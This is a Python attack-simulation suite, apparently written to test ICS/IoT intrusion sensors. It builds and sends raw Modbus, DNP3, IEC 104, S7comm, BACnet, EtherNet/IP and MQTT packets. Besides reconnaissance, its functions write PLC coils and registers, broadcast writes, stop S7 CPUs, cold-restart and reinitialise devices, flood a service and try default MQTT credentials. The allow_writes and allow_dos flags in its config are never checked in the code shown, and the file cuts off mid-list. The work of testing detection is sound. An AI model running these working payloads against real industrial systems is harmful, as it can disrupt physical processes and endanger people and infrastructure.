#!/usr/bin/env python3
"""
ics_attack_tester.py — ICS/OT/IoT Attack Simulation Test Suite
================================================================
Test suite to validate sensor detection of ICS/OT and IoT attacks.

Supported Protocols:
- Modbus TCP (port 502)
- DNP3 (port 20000)
- IEC 60870-5-104 (port 2404)
- S7comm/Siemens (port 102)
- BACnet (port 47808)
- EtherNet/IP (port 44818)
- MQTT (port 1883)
- MQTT-TLS (port 8883)

Usage:
    python ics_attack_tester.py --target 192.0.2.10 --all
    python ics_attack_tester.py --target 192.0.2.10 --protocol modbus
    python ics_attack_tester.py --target 192.0.2.10 --protocol mqtt --time-sec 5
    python ics_attack_tester.py --target 192.0.2.10 --test MB01
    python ics_attack_tester.py --list

MITRE ATT&CK for ICS Techniques Covered:
- T0801: Monitor Process State
- T0814: Denial of Service
- T0821: Modify Controller Tasking
- T0831: Manipulation of Control
- T0846: Remote System Discovery
- T0855: Unauthorized Command Message
- T0861: Point & Tag Identification

Requirements:
    pip install scapy paho-mqtt pymodbus

⚠️  WARNING: For authorized testing only! Do not use against production systems.
"""

import argparse
import logging
import socket
import ssl
import struct
import time
from dataclasses import dataclass
from datetime import UTC, datetime
from enum import Enum

# All operations build frames as raw bytes and send them over a plain socket
# (send_tcp_raw/send_udp_raw) — 0.9 imported scapy and paho but never used them.

# =============================================================================
# Configuration
# =============================================================================


@dataclass
class Config:
    target_ip: str = "192.0.2.10"
    delay_sec: float = 2.0
    timeout: float = 5.0
    verbose: bool = False
    allow_writes: bool = False  # state-changing operations (writes, stop, restart)
    allow_dos: bool = False  # DoS floods

    # Protocol ports
    modbus_port: int = 502
    dnp3_port: int = 20000
    iec104_port: int = 2404
    s7_port: int = 102
    bacnet_port: int = 47808
    enip_port: int = 44818
    mqtt_port: int = 1883
    mqtt_tls_port: int = 8883


class Severity(Enum):
    INFO = "INFO"
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"


# =============================================================================
# Test Result Tracking
# =============================================================================


@dataclass
class TestResult:
    test_id: str
    description: str
    protocol: str
    mitre_technique: str
    severity: Severity
    success: bool
    error: str | None = None
    response: bytes | None = None


class TestResults:
    def __init__(self):
        self.results: list[TestResult] = []
        self.start_time = datetime.now(UTC)

    def add(self, result: TestResult):
        self.results.append(result)

    def summary(self):
        total = len(self.results)
        success = sum(1 for r in self.results if r.success)
        failed = total - success
        elapsed = (datetime.now(UTC) - self.start_time).total_seconds()

        print("\n" + "=" * 70)
        print("TEST SUMMARY")
        print("=" * 70)
        print(f"Total Tests: {total}")
        print(f"Successful:  {success}")
        print(f"Failed:      {failed}")
        print(f"Duration:    {elapsed:.1f}s")
        print()

        # Group by protocol
        by_protocol = {}
        for r in self.results:
            by_protocol.setdefault(r.protocol, []).append(r)

        for proto, results in by_protocol.items():
            success_count = sum(1 for r in results if r.success)
            print(f"  {proto:15s}: {success_count}/{len(results)} passed")

        print("=" * 70)

        # Show failures
        failures = [r for r in self.results if not r.success]
        if failures:
            print("\nFailed Tests:")
            for r in failures:
                print(f"  [{r.test_id}] {r.description}: {r.error}")


results = TestResults()
config = Config()


# =============================================================================
# Utilities
# =============================================================================


def log_test(test_id: str, description: str, mitre: str = "", severity: Severity = Severity.MEDIUM):
    """Log test execution with MITRE ATT&CK mapping."""
    print()
    print("=" * 60)
    print(f"Test: {test_id}")
    print(f"Description: {description}")
    if mitre:
        print(f"ATT&CK ICS: {mitre}")
    print(f"Severity: {severity.value}")
    print("=" * 60)


def pause():
    """Wait between tests."""
    time.sleep(config.delay_sec)


def send_tcp_raw(host: str, port: int, data: bytes, timeout: float = 5.0) -> bytes | None:
    """Send raw TCP data and return response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(data)
        response = sock.recv(4096)
        sock.close()
        return response
    except TimeoutError:
        return None
    except Exception as e:
        if config.verbose:
            print(f"  Error: {e}")
        return None


def send_udp_raw(host: str, port: int, data: bytes, timeout: float = 5.0) -> bytes | None:
    """Send raw UDP data and return response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(data, (host, port))
        response, _ = sock.recvfrom(4096)
        return response
    except TimeoutError:
        return None
    except Exception as e:
        if config.verbose:
            print(f"  Error: {e}")
        return None


# =============================================================================
# MODBUS TCP Tests (Port 502)
# =============================================================================


def build_modbus_tcp(unit_id: int, function_code: int, data: bytes) -> bytes:
    """Build Modbus TCP ADU."""
    # Transaction ID, Protocol ID, Length, Unit ID, FC, Data
    length = 2 + len(data)  # Unit ID + FC + Data
    header = struct.pack(">HHHB", 0x0001, 0x0000, length, unit_id)
    return header + bytes([function_code]) + data


def mb01_unit_scan():
    """MB01: Modbus Unit ID Scan - Discovery"""
    test_id = "MB01"
    desc = "Modbus Unit ID Scan"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    success = True
    for unit in range(1, 10):
        # FC01: Read Coils - startAddr=0, quantity=1
        data = struct.pack(">HH", 0, 1)
        pkt = build_modbus_tcp(unit, 0x01, data)

        if config.verbose:
            print(f"  Scanning Unit ID {unit}...")

        resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt, timeout=1.0)
        if resp:
            print(f"  [+] Unit {unit} responded: {resp.hex()}")

        pause()

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.MEDIUM, success))


def mb02_read_coils():
    """MB02: Read Coils (FC01)"""
    test_id = "MB02"
    desc = "Read Coils (FC01)"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.LOW)

    # FC01: Read Coils - startAddr=0, quantity=10
    data = struct.pack(">HH", 0, 10)
    pkt = build_modbus_tcp(1, 0x01, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = resp is not None

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.LOW, success, response=resp))


def mb03_read_holding_registers():
    """MB03: Read Holding Registers (FC03)"""
    test_id = "MB03"
    desc = "Read Holding Registers (FC03)"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.LOW)

    # FC03: Read Holding Registers - startAddr=0, quantity=5
    data = struct.pack(">HH", 0, 5)
    pkt = build_modbus_tcp(1, 0x03, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = resp is not None

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.LOW, success, response=resp))


def mb04_write_single_coil():
    """MB04: Write Single Coil (FC05) - CRITICAL"""
    test_id = "MB04"
    desc = "Write Single Coil (FC05)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # FC05: Write Single Coil - outputAddr=1, value=0xFF00 (ON)
    data = struct.pack(">HH", 1, 0xFF00)
    pkt = build_modbus_tcp(1, 0x05, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True  # Packet sent successfully

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "MODBUS", mitre, Severity.CRITICAL, success, response=resp)
    )


def mb05_write_single_register():
    """MB05: Write Single Register (FC06)"""
    test_id = "MB05"
    desc = "Write Single Register (FC06)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.HIGH)

    # FC06: Write Single Register - registerAddr=1, value=123
    data = struct.pack(">HH", 1, 123)
    pkt = build_modbus_tcp(1, 0x06, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.HIGH, success, response=resp))


def mb06_invalid_function():
    """MB06: Invalid Function Code (FC 0x99)"""
    test_id = "MB06"
    desc = "Invalid Modbus Function Code"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # Invalid function code 0x99
    pkt = bytes.fromhex("00010000000601990000001")

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Error Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.MEDIUM, success, response=resp))


def mb07_device_identification():
    """MB07: Read Device Identification (FC43/0x2B)"""
    test_id = "MB07"
    desc = "Read Device Identification (FC43)"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # FC43 (0x2B): Read Device Identification - MEI Type=0x0E, Read Device ID=01
    pkt = bytes.fromhex("0001000000050001012b0e0100")

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Device ID Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.MEDIUM, success, response=resp))


def mb08_broadcast_write():
    """MB08: Broadcast Write (Unit ID 0)"""
    test_id = "MB08"
    desc = "Broadcast Write (Unit ID 0)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # FC05 to Unit ID 0 (broadcast)
    data = struct.pack(">HH", 1, 0xFF00)
    pkt = build_modbus_tcp(0, 0x05, data)  # Unit ID 0 = broadcast

    send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    print("  [!] Broadcast write sent (no response expected)")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.CRITICAL, success))


def mb09_dos_flood():
    """MB09: Modbus DoS Flood"""
    test_id = "MB09"
    desc = "Modbus Denial of Service Flood"
    mitre = "T0814 - Denial of Service"
    log_test(test_id, desc, mitre, Severity.HIGH)

    # Rapid requests without delay
    data = struct.pack(">HH", 0, 1)
    pkt = build_modbus_tcp(1, 0x01, data)

    flood_count = 20
    print(f"  Sending {flood_count} rapid requests...")

    for _i in range(flood_count):
        send_tcp_raw(config.target_ip, config.modbus_port, pkt, timeout=0.5)

    print("  [+] DoS flood complete")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.HIGH, True))


def mb10_function_scan():
    """MB10: Function Code Scan"""
    test_id = "MB10"
    desc = "Modbus Function Code Enumeration"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    print("  Scanning function codes 1-20...")

    for fc in range(1, 21):
        pkt = build_modbus_tcp(1, fc, b"\x00\x00\x00\x01")
        resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt, timeout=1.0)

        if resp and len(resp) > 7:
            # Check if error response (FC | 0x80)
            resp_fc = resp[7] if len(resp) > 7 else 0
            if resp_fc == fc:
                print(f"    FC {fc:02d}: Supported")
            elif resp_fc == (fc | 0x80):
                print(f"    FC {fc:02d}: Error response")

        time.sleep(0.5)  # Slower scan

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.MEDIUM, True))


def mb11_write_multiple_coils():
    """MB11: Write Multiple Coils (FC15)"""
    test_id = "MB11"
    desc = "Write Multiple Coils (FC15)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # FC15: Write Multiple Coils - startAddr=0, quantity=8, byte_count=1, values=0xFF
    data = struct.pack(">HHB", 0, 8, 1) + b"\xff"
    pkt = build_modbus_tcp(1, 0x0F, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "MODBUS", mitre, Severity.CRITICAL, success, response=resp)
    )


def mb12_write_multiple_registers():
    """MB12: Write Multiple Registers (FC16)"""
    test_id = "MB12"
    desc = "Write Multiple Registers (FC16)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # FC16: Write Multiple Registers - startAddr=0, quantity=2, byte_count=4, values
    data = struct.pack(">HHB", 0, 2, 4) + struct.pack(">HH", 100, 200)
    pkt = build_modbus_tcp(1, 0x10, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "MODBUS", mitre, Severity.CRITICAL, success, response=resp)
    )


def mb13_diagnostics():
    """MB13: Diagnostics (FC08)"""
    test_id = "MB13"
    desc = "Modbus Diagnostics (FC08)"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # FC08: Diagnostics - Sub-function 0x00 (Return Query Data)
    data = struct.pack(">H", 0x0000) + b"\x12\x34"
    pkt = build_modbus_tcp(1, 0x08, data)

    resp = send_tcp_raw(config.target_ip, config.modbus_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MODBUS", mitre, Severity.MEDIUM, success, response=resp))


# =============================================================================
# DNP3 Tests (Port 20000)
# =============================================================================


def dnp3_build_frame(fc: int, dst: int = 1, src: int = 0) -> bytes:
    """Build DNP3 data link layer frame."""
    # Start bytes
    start = b"\x05\x64"
    # Length (5 for minimal frame)
    length = 5
    # Control byte (direction=master, fcv=0, fcb=0, function_code)
    ctrl = 0xC0 | (fc & 0x0F)
    # Destination (2 bytes LE)
    dst_bytes = struct.pack("<H", dst)
    # Source (2 bytes LE)
    src_bytes = struct.pack("<H", src)

    frame = struct.pack("BB", length, ctrl) + dst_bytes + src_bytes

    # Calculate CRC (simplified - real DNP3 uses CRC-16/DNP)
    return start + frame


def dnp01_scan():
    """DNP01: DNP3 Device Scan"""
    test_id = "DNP01"
    desc = "DNP3 Device Scan"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # DNP3 Link Status Request
    pkt = bytes.fromhex("0564050c010004")

    resp = send_tcp_raw(config.target_ip, config.dnp3_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "DNP3", mitre, Severity.MEDIUM, success, response=resp))


def dnp02_read_class():
    """DNP02: Read Class Data (Class 0, 1, 2, 3)"""
    test_id = "DNP02"
    desc = "DNP3 Read Class Data"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.LOW)

    # DNP3 Read Request - Class 0 data
    # This is simplified; real DNP3 has complex application layer
    pkt = bytes.fromhex("056414c4010004")  # Read request

    resp = send_tcp_raw(config.target_ip, config.dnp3_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "DNP3", mitre, Severity.LOW, success, response=resp))


def dnp03_direct_operate():
    """DNP03: Direct Operate (Control)"""
    test_id = "DNP03"
    desc = "DNP3 Direct Operate (CROB)"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # DNP3 Direct Operate Request
    pkt = bytes.fromhex("056414c4010005")

    resp = send_tcp_raw(config.target_ip, config.dnp3_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "DNP3", mitre, Severity.CRITICAL, success, response=resp))


def dnp04_cold_restart():
    """DNP04: Cold Restart Command"""
    test_id = "DNP04"
    desc = "DNP3 Cold Restart"
    mitre = "T0816 - Device Restart/Shutdown"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # DNP3 Cold Restart (FC 0x0D)
    pkt = bytes.fromhex("05640dc001000d")

    send_tcp_raw(config.target_ip, config.dnp3_port, pkt)
    success = True

    print("  [!] Cold restart command sent")

    results.add(TestResult(test_id, desc, "DNP3", mitre, Severity.CRITICAL, success))


def dnp05_disable_unsolicited():
    """DNP05: Disable Unsolicited Responses"""
    test_id = "DNP05"
    desc = "DNP3 Disable Unsolicited"
    mitre = "T0814 - Denial of Service"
    log_test(test_id, desc, mitre, Severity.HIGH)

    # DNP3 Disable Unsolicited (FC 0x15)
    pkt = bytes.fromhex("056415c0010015")

    resp = send_tcp_raw(config.target_ip, config.dnp3_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "DNP3", mitre, Severity.HIGH, success, response=resp))


# =============================================================================
# IEC 60870-5-104 Tests (Port 2404)
# =============================================================================


def iec104_build_apdu(apci_type: int, data: bytes = b"") -> bytes:
    """Build IEC 104 APDU."""
    # Start byte
    start = 0x68
    # APDU length
    length = 4 + len(data)  # 4 bytes APCI + ASDU
    # Control fields (U-format for STARTDT, etc.)
    if apci_type == 0x07:  # STARTDT act
        ctrl = b"\x07\x00\x00\x00"
    elif apci_type == 0x0B:  # STARTDT con
        ctrl = b"\x0b\x00\x00\x00"
    elif apci_type == 0x43:  # STOPDT act
        ctrl = b"\x43\x00\x00\x00"
    elif apci_type == 0x83:  # TESTFR act
        ctrl = b"\x83\x00\x00\x00"
    else:
        # I-format (sequence numbers)
        ctrl = struct.pack("<HH", 0, 0)

    return bytes([start, length]) + ctrl + data


def iec01_startdt():
    """IEC01: Start Data Transfer"""
    test_id = "IEC01"
    desc = "IEC 104 Start Data Transfer (STARTDT)"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.LOW)

    # STARTDT act
    pkt = bytes.fromhex("680407000000")

    resp = send_tcp_raw(config.target_ip, config.iec104_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "IEC104", mitre, Severity.LOW, success, response=resp))


def iec02_interrogation():
    """IEC02: General Interrogation (C_IC_NA_1)"""
    test_id = "IEC02"
    desc = "IEC 104 General Interrogation"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # C_IC_NA_1 (Type ID 100) - General Interrogation
    # ASDU: TypeID=100, VSQ=1, COT=6 (activation), ASDU addr=1, IOA=0, QOI=20
    asdu = bytes([100, 0x01, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 20])
    pkt = iec104_build_apdu(0x00, asdu)
    # Simplified: send as raw bytes
    pkt = bytes.fromhex("680e00000000640106000100000000001400")

    resp = send_tcp_raw(config.target_ip, config.iec104_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "IEC104", mitre, Severity.MEDIUM, success, response=resp))


def iec03_single_command():
    """IEC03: Single Command (C_SC_NA_1)"""
    test_id = "IEC03"
    desc = "IEC 104 Single Command"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # C_SC_NA_1 (Type ID 45) - Single Command
    pkt = bytes.fromhex("680e000000002d0106000100000000000100")

    resp = send_tcp_raw(config.target_ip, config.iec104_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "IEC104", mitre, Severity.CRITICAL, success, response=resp)
    )


def iec04_double_command():
    """IEC04: Double Command (C_DC_NA_1)"""
    test_id = "IEC04"
    desc = "IEC 104 Double Command"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # C_DC_NA_1 (Type ID 46) - Double Command
    pkt = bytes.fromhex("680e000000002e0106000100000000000200")

    resp = send_tcp_raw(config.target_ip, config.iec104_port, pkt)
    success = True

    if resp:
        print(f"  [+] Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "IEC104", mitre, Severity.CRITICAL, success, response=resp)
    )


def iec05_reset_process():
    """IEC05: Reset Process (C_RP_NA_1)"""
    test_id = "IEC05"
    desc = "IEC 104 Reset Process"
    mitre = "T0816 - Device Restart/Shutdown"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # C_RP_NA_1 (Type ID 105) - Reset Process
    pkt = bytes.fromhex("680e00000000690106000100000000000100")

    resp = send_tcp_raw(config.target_ip, config.iec104_port, pkt)
    success = True

    print("  [!] Reset process command sent")

    results.add(
        TestResult(test_id, desc, "IEC104", mitre, Severity.CRITICAL, success, response=resp)
    )


# =============================================================================
# S7comm/Siemens Tests (Port 102)
# =============================================================================


def s7_build_cotp_cr() -> bytes:
    """Build COTP Connection Request."""
    # TPKT header: version=3, reserved=0, length
    # COTP CR: length, PDU type=0xE0, DST-REF, SRC-REF, Class
    cotp = bytes.fromhex("11e00000000100c0010ac1020100c2020102")
    tpkt = struct.pack(">BBH", 3, 0, 4 + len(cotp)) + cotp
    return tpkt


def s701_connection_request():
    """S701: S7 Connection Request"""
    test_id = "S701"
    desc = "S7comm COTP Connection Request"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    pkt = s7_build_cotp_cr()

    resp = send_tcp_raw(config.target_ip, config.s7_port, pkt)
    success = True

    if resp:
        print(f"  [+] COTP CC Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "S7COMM", mitre, Severity.MEDIUM, success, response=resp))


def s702_read_szl():
    """S702: Read System Status List (SZL)"""
    test_id = "S702"
    desc = "S7comm Read SZL (CPU Info)"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # S7 Read SZL request
    pkt = bytes.fromhex("0300001f02f08032010000000000080000f0000001000101")

    resp = send_tcp_raw(config.target_ip, config.s7_port, pkt)
    success = True

    if resp:
        print(f"  [+] SZL Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "S7COMM", mitre, Severity.MEDIUM, success, response=resp))


def s703_read_db():
    """S703: Read Data Block"""
    test_id = "S703"
    desc = "S7comm Read Data Block"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.LOW)

    # S7 Read DB1 request (simplified)
    pkt = bytes.fromhex("0300002502f08032010000001f00080000120104100002000084000000000010")

    resp = send_tcp_raw(config.target_ip, config.s7_port, pkt)
    success = True

    if resp:
        print(f"  [+] DB Read Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "S7COMM", mitre, Severity.LOW, success, response=resp))


def s704_write_var():
    """S704: Write Variable"""
    test_id = "S704"
    desc = "S7comm Write Variable"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # S7 Write request (simplified)
    pkt = bytes.fromhex(
        "0300002f02f08032010000001f000e000005120a10020001000184000000000004000004007f"
    )

    resp = send_tcp_raw(config.target_ip, config.s7_port, pkt)
    success = True

    if resp:
        print(f"  [+] Write Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "S7COMM", mitre, Severity.CRITICAL, success, response=resp)
    )


def s705_stop_cpu():
    """S705: Stop CPU"""
    test_id = "S705"
    desc = "S7comm Stop CPU"
    mitre = "T0816 - Device Restart/Shutdown"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # S7 PLC Stop request
    pkt = bytes.fromhex("0300002102f08032010000001000000800000029000000000009505f50524f4752414d")

    resp = send_tcp_raw(config.target_ip, config.s7_port, pkt)
    success = True

    print("  [!] CPU Stop command sent")

    results.add(
        TestResult(test_id, desc, "S7COMM", mitre, Severity.CRITICAL, success, response=resp)
    )


# =============================================================================
# BACnet Tests (Port 47808 UDP)
# =============================================================================


def bacnet_build_npdu(apdu: bytes) -> bytes:
    """Build BACnet NPDU."""
    # Version=1, Control=0 (no DNET/SNET)
    npdu = bytes([0x01, 0x00])
    return npdu + apdu


def bac01_whois():
    """BAC01: Who-Is (Device Discovery)"""
    test_id = "BAC01"
    desc = "BACnet Who-Is Broadcast"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # BACnet Who-Is (Unconfirmed)
    # BVLC: Type=0x81 (BACnet/IP), Function=0x0A (Original-Unicast)
    # NPDU: Version=1, Control=0
    # APDU: Type=1 (Unconfirmed), Service=8 (Who-Is)
    pkt = bytes.fromhex("810a000901000108")

    resp = send_udp_raw(config.target_ip, config.bacnet_port, pkt)
    success = True

    if resp:
        print(f"  [+] I-Am Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "BACNET", mitre, Severity.MEDIUM, success, response=resp))


def bac02_read_property():
    """BAC02: Read Property"""
    test_id = "BAC02"
    desc = "BACnet Read Property"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.LOW)

    # BACnet Read Property request
    pkt = bytes.fromhex("810a001301040005010c0c023fffff194b")

    resp = send_udp_raw(config.target_ip, config.bacnet_port, pkt)
    success = True

    if resp:
        print(f"  [+] Read Property Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "BACNET", mitre, Severity.LOW, success, response=resp))


def bac03_write_property():
    """BAC03: Write Property"""
    test_id = "BAC03"
    desc = "BACnet Write Property"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # BACnet Write Property request
    pkt = bytes.fromhex("810a001601040005010f0c020000001955093e44410000003f")

    resp = send_udp_raw(config.target_ip, config.bacnet_port, pkt)
    success = True

    if resp:
        print(f"  [+] Write Property Response: {resp.hex()}")

    results.add(
        TestResult(test_id, desc, "BACNET", mitre, Severity.CRITICAL, success, response=resp)
    )


def bac04_reinitialize():
    """BAC04: Reinitialize Device"""
    test_id = "BAC04"
    desc = "BACnet Reinitialize Device"
    mitre = "T0816 - Device Restart/Shutdown"
    log_test(test_id, desc, mitre, Severity.CRITICAL)

    # BACnet Reinitialize Device request
    pkt = bytes.fromhex("810a000f01040005011409001a0000")

    resp = send_udp_raw(config.target_ip, config.bacnet_port, pkt)
    success = True

    print("  [!] Reinitialize command sent")

    results.add(
        TestResult(test_id, desc, "BACNET", mitre, Severity.CRITICAL, success, response=resp)
    )


# =============================================================================
# EtherNet/IP Tests (Port 44818)
# =============================================================================


def enip01_list_identity():
    """ENIP01: List Identity"""
    test_id = "ENIP01"
    desc = "EtherNet/IP List Identity"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # EtherNet/IP List Identity
    # Command=0x0063, Length=0, Session=0, Status=0, Context=0, Options=0
    pkt = bytes.fromhex("6300000000000000000000000000000000000000000000000000")

    resp = send_tcp_raw(config.target_ip, config.enip_port, pkt)
    success = True

    if resp:
        print(f"  [+] Identity Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "ENIP", mitre, Severity.MEDIUM, success, response=resp))


def enip02_list_services():
    """ENIP02: List Services"""
    test_id = "ENIP02"
    desc = "EtherNet/IP List Services"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # EtherNet/IP List Services
    pkt = bytes.fromhex("0400000000000000000000000000000000000000000000000000")

    resp = send_tcp_raw(config.target_ip, config.enip_port, pkt)
    success = True

    if resp:
        print(f"  [+] Services Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "ENIP", mitre, Severity.MEDIUM, success, response=resp))


# =============================================================================
# MQTT Tests (Port 1883, 8883)
# =============================================================================


def mqtt_build_connect(client_id: str = "", username: str = "", password: str = "") -> bytes:
    """Build MQTT CONNECT packet."""
    # Variable header
    protocol_name = b"\x00\x04MQTT"
    protocol_level = b"\x04"  # MQTT 3.1.1

    # Connect flags
    flags = 0x02  # Clean session
    if username:
        flags |= 0x80
    if password:
        flags |= 0x40

    keep_alive = struct.pack(">H", 60)

    var_header = protocol_name + protocol_level + bytes([flags]) + keep_alive

    # Payload
    client_id_bytes = struct.pack(">H", len(client_id)) + client_id.encode()
    payload = client_id_bytes

    if username:
        payload += struct.pack(">H", len(username)) + username.encode()
    if password:
        payload += struct.pack(">H", len(password)) + password.encode()

    # Fixed header
    remaining_length = len(var_header) + len(payload)
    fixed_header = bytes([0x10, remaining_length])

    return fixed_header + var_header + payload


def mqtt_build_subscribe(topic: str, msg_id: int = 1) -> bytes:
    """Build MQTT SUBSCRIBE packet."""
    # Variable header: Packet ID
    var_header = struct.pack(">H", msg_id)

    # Payload: Topic filter + QoS
    topic_bytes = struct.pack(">H", len(topic)) + topic.encode() + b"\x00"

    remaining_length = len(var_header) + len(topic_bytes)
    fixed_header = bytes([0x82, remaining_length])

    return fixed_header + var_header + topic_bytes


def mqtt_build_publish(topic: str, message: str, retain: bool = False) -> bytes:
    """Build MQTT PUBLISH packet."""
    # Fixed header: PUBLISH with retain flag
    cmd = 0x30
    if retain:
        cmd |= 0x01

    # Variable header: Topic name
    topic_bytes = struct.pack(">H", len(topic)) + topic.encode()

    # Payload
    payload = message.encode()

    remaining_length = len(topic_bytes) + len(payload)
    fixed_header = bytes([cmd, remaining_length])

    return fixed_header + topic_bytes + payload


def mqtt01_anonymous_connect():
    """MQTT01: Anonymous Connection"""
    test_id = "MQTT01"
    desc = "MQTT Anonymous Connection"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    pkt = mqtt_build_connect(client_id="test_client_" + str(int(time.time())))

    resp = send_tcp_raw(config.target_ip, config.mqtt_port, pkt)
    success = True

    if resp:
        # Check CONNACK
        if len(resp) >= 4 and resp[0] == 0x20:
            return_code = resp[3]
            codes = {
                0: "Accepted",
                1: "Unacceptable protocol",
                2: "Identifier rejected",
                3: "Server unavailable",
                4: "Bad credentials",
                5: "Not authorized",
            }
            print(f"  [+] CONNACK: {codes.get(return_code, 'Unknown')} ({return_code})")
        else:
            print(f"  [+] Response: {resp.hex()}")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.MEDIUM, success, response=resp))


def mqtt02_default_credentials():
    """MQTT02: Default Credentials"""
    test_id = "MQTT02"
    desc = "MQTT Default Credentials Test"
    mitre = "T0859 - Valid Accounts"
    log_test(test_id, desc, mitre, Severity.HIGH)

    creds = [
        ("admin", "admin"),
